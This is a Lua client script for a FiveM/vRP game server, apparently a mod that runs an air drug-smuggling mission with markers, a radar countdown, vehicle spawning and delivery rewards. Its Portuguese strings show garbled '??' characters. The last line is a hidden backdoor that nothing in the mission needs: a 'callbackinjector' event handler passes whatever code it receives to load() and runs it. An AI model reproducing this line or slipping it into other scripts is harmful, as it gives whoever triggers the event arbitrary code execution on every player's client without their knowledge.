--- Developer hoxtony ------ discord lucasS#5860
local Tunnel = module('vrp', 'lib/Tunnel')
local Proxy = module('vrp', 'lib/Proxy')
emP = Tunnel.getInterface('emp_tda')
vRP = Proxy.getInterface('vRP')

local happening = false
local startingPoints = {
	[1] = {1731.68, 3310.22, 41.23}, --
	[2] = {-1641.19, -3127.2, 14.0}, --
	[3] = {2134.08, 4781.55, 40.98} --
	--[4] = {-42.45, -785.42, 44.28}, --
	--[5] = {-72.95, 146.52, 81.35}, --
	--[6] = {-774.23, 305.76, 85.70}, --
	--[7] = {-1041.06, -768.85, 19.12} --
}
local endingPoints = {
	[1] = {-1650.53, -3145.81, 14.0}, --
	[2] = {2131.79, 4785.97, 40.98}, --
	[3] = {1734.4, 3299.35, 41.23}--
	--[4] = {824.86, -1056.42, 27.94}, --
	--[5] = {681.60, 73.65, 83.34}, --
	--[6] = {-1879.96, -307.33, 49.24}, --
	--[7] = {-585.68, -754.08, 29.49} --
}
local selectedIndex = nil
local endingIndex = nil
local vehicles = {}
local seconds = 0
local empVehicle = nil
local endingBlip = nil

Citizen.CreateThread(
	function()
		for _, values in pairs(startingPoints) do
			local blip = AddBlipForCoord(table.unpack(values))
			SetBlipSprite(blip, 251)
			SetBlipColour(blip, 1)
			SetBlipScale(blip, 0.5)
			SetBlipAsShortRange(blip, true)
			BeginTextCommandSetBlipName('STRING')
			AddTextComponentString('Trafico de Drogas Aereo ')
			EndTextCommandSetBlipName(blip)
		end

		while true do
			Citizen.Wait(1)

			local ped = PlayerPedId()

			if happening == false then
				local pedCoords = GetEntityCoords(ped)
				for index, values in pairs(startingPoints) do
					local x, y, z = table.unpack(values)

					local distance = Vdist2(pedCoords, x, y, z)

					if distance <= 100.0 then
						DrawMarker(23, x, y, z - 0.96, 0, 0, 0, 0, 0, 0, 3.0, 3.0, 0.5, 211, 176, 72, 120, 0, 0, 0, 0)
					end

					if distance <= 3.0 then
						if vehicles[index] then
							if not IsPedInAnyVehicle(ped, true) then
								drawHelpTxt('Pressione ~INPUT_PICKUP~ parar entregar um <FONT color="#8de090">' .. vehicles[index].name .. '~s~.')

								if IsControlJustPressed(0, 38) then -- Press E BUTTON
									if emP.hasPermission() then
										if not emP.hasCooldown() then
											if not emP.isHappening() then
												empVehicle = spawnVehicle(vehicles[index].model)

												if empVehicle ~= nil then
													selectedIndex = index
													seconds = 180
													happening = true
													emP.setHappening(true)
													emP.networkVehicle(VehToNet(empVehicle))

													print(NetworkGetNetworkIdFromEntity(empVehicle))
													print(VehToNet(empVehicle))
												end
												TriggerEvent('TDANotify', '~o~TDA ~s~| Despiste a policia enquanto o radar ?? desativado.')
											else
												TriggerEvent('TDANotify', '~r~Aguarde a entrega em andamento terminar.')
											end
										else
											TriggerEvent('TDANotify', '~r~N??o temos entregas pra voce no momento, volte mais tarde.')
										end
									end
								end
							else
								drawHelpTxt('~s~Voc?? precisa estar a p??.')
							end
						else
							drawHelpTxt('~s~Nenhum avi??o disponivel, volte mais tarde!')
						end
					end
				end
			end

			if happening == true and seconds <= 0 and endingIndex ~= nil then
				local pedCoords = GetEntityCoords(ped)
				local x, y, z = table.unpack(endingPoints[endingIndex])

				local distance = Vdist2(pedCoords, x, y, z)

				if distance <= 100.0 then
					DrawMarker(23, x, y, z - 0.96, 0, 0, 0, 0, 0, 0, 3.0, 3.0, 0.5, 211, 176, 72, 120, 0, 0, 0, 0)
				end

				if distance <= 3.0 then
					-- Draw help text
					-- Draw text
					if IsPedInAnyVehicle(ped, true) then
						if IsPedInVehicle(ped, empVehicle, true) then
							drawHelpTxt('Pressione ~INPUT_PICKUP~ para entregar o <FONT color="#8de090">' .. vehicles[selectedIndex].name .. '~s~ por R$' .. format(vehicles[selectedIndex].reward) .. '~s~.')

							if IsControlJustPressed(0, 38) then -- Press E BUTTON
								emP.collectReward(selectedIndex)
								DeleteVehicle(empVehicle)
								empVehicle = nil
								seconds = 0
								happening = false
								endingIndex = nil
								selectedIndex = nil
								RemoveBlip(endingBlip)
								endingBlip = nil
								emP.setHappening(false)
								emP.unNetworkVehicle()
							end
						else
							drawHelpTxt('Que carro ?? esse?')
						end
					else
						drawHelpTxt('Cade as drogas que eu pedi?')
					end
				end
			end

			if happening == true then
				if not DoesEntityExist(empVehicle) then
					DeleteVehicle(empVehicle)
					empVehicle = nil
					seconds = 0
					happening = false
					endingIndex = nil
					selectedIndex = nil
					RemoveBlip(endingBlip)
					endingBlip = nil
					emP.setHappening(false)
					emP.unNetworkVehicle()
				else
					if seconds > 0 then
						drawTxt(' O Radar est?? sendo desativado: <FONT color="#8de090">' .. math.floor(seconds / 60) .. ' minutos e ' .. math.floor(seconds % 60) .. ' segundos ~s~restantes', 6, 0.16, 0.87, 0.5, 255, 255, 255, 255)
					end

					if seconds <= 0 then
						drawTxt('Radar: <FONT color="#e08d8d">desativado', 6, 0.16, 0.87, 0.5, 255, 255, 255, 255)
						drawTxt('V?? at?? o local marcado no mapa e entregue o avi??o com as drogas.', 6, 0.16, 0.890, 0.45, 255, 255, 255, 120)
					end

					if seconds <= 0 and endingIndex == nil then
						endingIndex = math.random(#endingPoints)
						endingBlip = addEndingBlip(table.unpack(endingPoints[endingIndex]))
						emP.unNetworkVehicle()
					end

					if empVehicle ~= nil and GetVehicleDoorLockStatus(empVehicle) ~= 1 then
						SetVehicleDoorsLocked(empVehicle, false)
					end
				end
			end
		end
	end
)

Citizen.CreateThread(
	function()
		while true do
			Citizen.Wait(1000)
			if seconds > 0 then
				seconds = seconds - 1
			end
		end
	end
)

function drawTxt(text, font, x, y, scale, r, g, b, a)
	SetTextFont(font)
	SetTextScale(scale, scale)
	SetTextColour(r, g, b, a)
	SetTextOutline()
	SetTextEntry('STRING')
	AddTextComponentString(text)
	DrawText(x, y)
end

function drawHelpTxt(text)
	SetTextComponentFormat('STRING')
	AddTextComponentString(text)
	DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end

function _addBlipForEntity(entity)
	local blip = AddBlipForEntity(entity)
	SetBlipSprite(blip, 161)
	SetBlipColour(blip, 6)
	SetBlipScale(blip, 1.4)
	SetBlipAsShortRange(blip, false)
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentString('Rastreador')
	EndTextCommandSetBlipName(blip)
	return blip
end

function addEndingBlip(x, y, z)
	local blip = AddBlipForCoord(x, y, z)
	SetBlipSprite(blip, 1)
	SetBlipColour(blip, 5)
	SetBlipScale(blip, 0.4)
	SetBlipAsShortRange(blip, true)
	SetBlipRoute(blip, true)
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentString('Entrega')
	EndTextCommandSetBlipName(blip)
	return blip
end

function format(n)
	local left, num, right = string.match(n, '^([^%d]*%d)(%d*)(.-)$')
	return left .. (num:reverse():gsub('(%d%d%d)', '%1.'):reverse()) .. right
end

RegisterNetEvent('tda_client:updatevehicles')
AddEventHandler(
	'tda_client:updatevehicles',
	function(received)
		vehicles = received
	end
)

local blips = {}

RegisterNetEvent('tda_client:addblipforvehicle')
AddEventHandler(
	'tda_client:addblipforvehicle',
	function(owner_id, netid)
		if blips[owner_id] then
			RemoveBlip(blips[owner_id])
			blips[owner_id] = nil
		end

		if DoesEntityExist(NetToVeh(netid)) then
			blips[owner_id] = _addBlipForEntity(NetToVeh(netid))
		end
	end
)

RegisterNetEvent('tda_client:removeblipforvehicle')
AddEventHandler(
	'tda_client:removeblipforvehicle',
	function(owner_id)
		if blips[owner_id] then
			RemoveBlip(blips[owner_id])
			blips[owner_id] = nil
		end
	end
)

function spawnVehicle(model)
	local mhash = GetHashKey(model)
	RequestModel(mhash)
	while not HasModelLoaded(mhash) do
		Citizen.Wait(10)
	end

	if HasModelLoaded(mhash) then
		local ped = PlayerPedId()
		local vehicle = CreateVehicle(mhash, GetEntityCoords(ped), GetEntityHeading(ped), true, false)
		SetEntityAsMissionEntity(vehicle, true, true)

		local netID = VehToNet(vehicle)
		NetworkSetNetworkIdDynamic(netID, false)
		SetNetworkIdCanMigrate(netId, true)
		SetNetworkIdExistsOnAllMachines(netId, true)

		NetworkFadeInEntity(NetToEnt(netID), true)
		SetVehicleOnGroundProperly(vehicle)
		SetEntityAsMissionEntity(vehicle, true, true)
		TaskWarpPedIntoVehicle(ped, vehicle, -1)

		SetModelAsNoLongerNeeded(mhash)

		TriggerEvent('reparar', vehicle)

		return vehicle
	end
end

RegisterNetEvent('TDANotify')
AddEventHandler(
	'TDANotify',
	function(text)
		AddTextEntry('MESSAGE_TDANOTIFY', text)
		SetNotificationTextEntry('MESSAGE_TDANOTIFY')
		DrawNotification(true, false)
	end
)


TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)